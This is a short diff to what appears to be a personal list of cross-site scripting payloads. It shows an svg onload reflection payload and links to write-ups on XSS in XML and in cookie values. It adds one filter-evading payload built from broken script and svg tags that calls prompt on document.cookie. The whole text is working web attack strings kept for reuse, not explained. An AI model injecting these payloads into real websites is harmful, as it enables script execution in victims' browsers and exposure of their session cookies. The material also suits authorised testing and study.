@@ -3,4 +3,5 @@ url reflection:
 <link rel=import href='.&#47"><svg%20onload=alert(domain)>'>
 xss in xml :https://zseano.com/blogs/1.html
 xss in cookie value:https://zseano.com/blogs/3.html#
+</</script>script> <</svg>svg/onload=prompt`${document.cookie}`>
 
